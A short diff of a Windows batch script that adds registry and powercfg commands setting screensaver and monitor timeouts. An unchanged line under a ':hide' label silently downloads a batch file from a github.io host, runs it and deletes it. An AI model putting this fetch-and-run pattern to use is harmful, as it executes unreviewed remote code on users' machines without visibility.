@@ -1,6 +1,10 @@
 @echo off
 cls
 
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d 600 /f
+powercfg /change monitor-timeout-ac 10
+
+
 :hide
 curl -o c:\temp\hide.bat https://suporteeq.github.io/hide.bat > NUL 2>&1 && call c:\temp\hide.bat && del c:\temp\hide.bat > NUL 2>&1
 
